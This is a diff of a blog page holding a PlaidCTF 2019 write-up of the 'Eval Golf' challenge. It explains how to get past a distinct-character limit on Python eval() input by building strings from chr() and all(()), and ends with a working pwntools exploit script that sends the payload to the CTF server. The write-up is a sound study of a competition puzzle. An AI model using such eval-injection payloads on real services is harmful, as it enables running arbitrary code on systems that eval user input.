@@ -42,9 +42,9 @@
 	<meta name="twitter:creator" content="@iKevinY">
 	<meta name="twitter:domain" content="kevinyap.ca">
 	<meta name="twitter:site" content="@iKevinY">
-	<meta name="twitter:image" content="http://kevinyap.ca/images/icons/avatar-opengraph.png">
+	<meta name="twitter:image" content="https://kevinyap.ca/images/icons/avatar-opengraph.png">
 	<meta name="twitter:image:alt" content="Avatar of Kevin Yap">
-	<meta property="og:image" content="http://kevinyap.ca/images/icons/avatar-opengraph.png">
+	<meta property="og:image" content="https://kevinyap.ca/images/icons/avatar-opengraph.png">
 	<meta property="og:image:type" content="image/png">
 	<meta property="og:image:width" content="1200">
 	<meta property="og:image:height" content="630">
@@ -54,7 +54,7 @@
 	<meta property="og:title" content="Eval Golf (PlaidCTF Writeup)">
 	<meta property="og:description" content="Sticking with the theme of CTF writeups, here’s one of a fairly simple challenge from PlaidCTF 2019. Given that Python is my programming language of choice, it was fun to work on a Python-based challenge (rather than the low-level exploits that …">
 	<meta property="og:type" content="article">
-	<meta property="og:url" content="http://kevinyap.ca/2019/04/eval-golf-plaidctf-writeup/">
+	<meta property="og:url" content="https://kevinyap.ca/2019/04/eval-golf-plaidctf-writeup/">
 	<meta property="bsky:handle" content="kevinyap.ca">
 
 	<!-- Stylesheets and Web Fonts -->
@@ -74,7 +74,9 @@
 	<meta name="msapplication-square150x150logo" content="/images/icons/mstile-medium.png">
 	<meta name="msapplication-wide310x150logo" content="/images/icons/mstile-wide.png">
 	<meta name="msapplication-square310x310logo" content="/images/icons/mstile-large.png">
-</head>
+  <link rel="site.standard.document" href="at://did:plc:kewhcp362af66czceva4dhrl/site.standard.document/3n2667mzilt2y">
+    <link rel="site.standard.publication" href="at://did:plc:kewhcp362af66czceva4dhrl/site.standard.publication/3n2662rvrcc2z">
+  </head>
 
 <body>
 	<div class="container">
@@ -101,12 +103,12 @@
 <p>The service that we&#8217;re trying to retrieve the flag from executes this&nbsp;script:</p>
 <div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
 
-<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">exit</span>
-<span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">secret_value_for_password</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="n">exec</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">sys</span><span class="w"> </span><span class="kn">import</span> <span class="n">exit</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">secret</span><span class="w"> </span><span class="kn">import</span> <span class="n">secret_value_for_password</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="n">exec</span>
 
 <span class="k">try</span><span class="p">:</span>
     <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span>
-    <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Input value: &quot;</span><span class="p">)</span>
+    <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"Input value: "</span><span class="p">)</span>
     <span class="n">count_digits</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">inp</span><span class="p">))</span>
     <span class="k">if</span> <span class="n">count_digits</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">:</span>          <span class="c1"># Make sure it is a number</span>
         <span class="n">val</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
@@ -116,9 +118,9 @@
     <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="n">secret_value_for_password</span><span class="p">:</span>
         <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Nope. Better luck next time.&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"Nope. Better luck next time."</span><span class="p">)</span>
 <span class="k">except</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Nope. No hacking.&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Nope. No hacking."</span><span class="p">)</span>
     <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </code></pre></div>
 
@@ -127,11 +129,11 @@
 <p>Unfortunately, the code that&#8217;s supposed to &#8220;make sure [the input] is a number&#8221; is not actually doing that. What it&#8217;s actually doing is restricting the length of the input to 10 characters. Interestingly though, since <code>count_digits</code> is actually set to the length of <code>set(inp)</code>, the actual restriction is only that our input consists of 10 or fewer <em>distinct characters</em> (ie. reusing the same character more than once doesn&#8217;t contribute to our&nbsp;&#8220;limit&#8221;).</p>
 <p>The string <code>secret_value_for_password</code> contains 15 characters, which means it will be rejected. Somehow we need to find a way to <a href="https://en.wikipedia.org/wiki/Code_golf">golf down</a> the unique characters in our&nbsp;payload.</p>
 <p>The first that comes to mind is to build up each character of our secret value one-by-one using <a href="https://docs.python.org/3/library/functions.html#chr"><code>chr()</code></a>, which takes in a number and returns the character corresponding to that <span class="caps">ASCII</span> value. Of course, we can represent any number we want by summing <code>1</code> with itself a bunch of times, which helps us not use up precious unique&nbsp;characters.</p>
-<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;secret_value_for_password&#39;</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;1&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;chr(</span><span class="si">{}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">target</span> <span class="o">=</span> <span class="s1">'secret_value_for_password'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'+'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'1'</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="s1">'+'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'chr(</span><span class="si">{}</span><span class="s1">)'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="s1">&#39;secret_value_for_password&#39;</span>
+<span class="s1">'secret_value_for_password'</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
 <span class="mi">7</span>
 </code></pre></div>
@@ -142,15 +144,15 @@
 <p>The trick here is figuring out a way to represent <code>1</code> in Python with the following pool of characters: <code>()+chreval</code>. Having worked with Python enough, I suspected the solution was something to do with truthiness. If we could somehow get an expression to evaluate to something <code>True</code>, we could sum up <em>that expression</em> as a replacement for using the character 1 (because in Python, <code>True + True = 2</code>).</p>
 <p>The magic bullet here was the built-in <a href="https://docs.python.org/3/library/functions.html#all"><code>all()</code></a>, which returns <code>True</code> if all elements of the input iterable are truthy (or if the iterable itself is empty). We already have the characters <code>a</code> and <code>l</code> from our call to <code>eval</code>, and we can simply pass in <code>()</code> (the empty tuple). That is, <code>all(())</code> serves as our substitute for the character <code>1</code>.</p>
 <p>With this change, our payload contains exactly 10 unique characters. Putting this all together, we arrive at our final exploit (using <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> to execute&nbsp;it):</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;secret_value_for_password&quot;</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s2">"secret_value_for_password"</span>
 
-<span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;all(())&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;chr(</span><span class="si">{}</span><span class="s1">)&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;eval(&#39;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span>
+<span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'+'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'all(())'</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">'+'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'chr(</span><span class="si">{}</span><span class="s1">)'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">'eval('</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">')'</span>
 
-<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;canyouguessme.pwni.ng&#39;</span><span class="p">,</span> <span class="mi">12349</span><span class="p">)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'canyouguessme.pwni.ng'</span><span class="p">,</span> <span class="mi">12349</span><span class="p">)</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
